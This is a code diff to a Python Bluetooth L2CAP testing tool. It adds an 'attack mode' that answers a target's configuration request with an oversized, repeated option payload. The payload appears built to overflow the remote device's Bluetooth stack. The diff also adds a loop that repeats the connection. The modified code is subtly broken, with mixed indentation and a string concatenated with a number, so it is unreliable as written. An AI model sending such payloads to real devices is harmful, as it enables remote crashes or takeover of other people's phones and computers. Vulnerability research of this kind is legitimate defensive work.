@@ -6,6 +6,9 @@ from traced_bt_user_sock import BluetoothUserSocket_WithTrace
 # TODO: Allocate scid dynamically (currently it is hard coded to OUR_LOCAL_SCID)
 OUR_LOCAL_SCID = 0x40
 
+# daveti: for bt mbm
+lbm_attack_mode = False
+
 def hci_devid(dev):
     # Replacement to bluez's hci_devid because we don't care if the interface is
     # down
@@ -401,15 +404,17 @@ def lockstep_efs_conf_process(loop, scid, dcid):
     #daveti: debug
     print("daveti: into l2cap pending state now")
 
-    '''
-    resp = (L2CAP_Hdr(cid=1) / L2CAP_CmdHdr(id=conf_req.id) /
+    #daveti: mbm mode
+    if not lbm_attack_mode:
+	resp = (L2CAP_Hdr(cid=1) / L2CAP_CmdHdr(id=conf_req.id) /
             L2CAP_ConfResp(scid=dcid, flags=0, result=4) /
             Raw(binascii.unhexlify('01020004')))
-    '''
-    # daveti: attack
-    resp = (L2CAP_Hdr(cid=1) / L2CAP_CmdHdr(id=conf_req.id) /
+    else:
+	# daveti: attack
+	resp = (L2CAP_Hdr(cid=1) / L2CAP_CmdHdr(id=conf_req.id) /
             L2CAP_ConfResp(scid=dcid, flags=0, result=4) /
             Raw(binascii.unhexlify('01020004010200040102000401020004010200040102000401020004010200040102000401020004010200040102000401020004010200040102000401020004')))
+
     loop.on(lambda conf_resp: conf_resp is not None and
                               conf_resp.id == 1 and
                               L2CAP_ConfResp in conf_resp and
@@ -543,22 +548,26 @@ def l2cap_mutual_configration(l2cap_loop, dcid):
     lockstep_efs_conf_process(l2cap_loop, OUR_LOCAL_SCID, dcid)
 
     
-def main(src_hci, dst_bdaddr, pcap_path=None):
-    l2cap_loop, _ = create_l2cap_connection(src_hci, dst_bdaddr, pcap_path=pcap_path)
+def main(src_hci, dst_bdaddr, pcap_path=None, rep_num=1):
+    while (rep_num > 0):
+	l2cap_loop, _ = create_l2cap_connection(src_hci, dst_bdaddr, pcap_path=pcap_path)
 
-    # Seding 'test' to the established l2cap connection
-    print("Sending 'test' in l2cap connection")
-    l2cap_loop.send(L2CAP_Hdr(cid=OUR_LOCAL_SCID) / Raw('test'))
-    l2cap_loop.on(lambda pkt: True,
-                  lambda loop, pkt: pkt)
+    	# Seding 'test' to the established l2cap connection
+    	print("Sending 'test' in l2cap connection: " + rep_num)
+    	l2cap_loop.send(L2CAP_Hdr(cid=OUR_LOCAL_SCID) / Raw('test'))
+    	l2cap_loop.on(lambda pkt: True,
+                      lambda loop, pkt: pkt)
     
-    # And printing the returned data.
-    print(repr(l2cap_loop.cont()))
-    l2cap_loop.finish()
+    	# And printing the returned data.
+    	print(repr(l2cap_loop.cont()))
+    	l2cap_loop.finish()
+
+	rep_num -= 1
+
 
 if __name__ == '__main__':
     if len(sys.argv) < 2:
-        print("Usage: l2cap_infra.py <src-hci> <dst-bdaddr> (<pcap_path>)")
+        print("Usage: l2cap_infra.py <src-hci> <dst-bdaddr> (<pcap_path>, <rep_num>)")
     else:
         main(*sys.argv[1:])
 
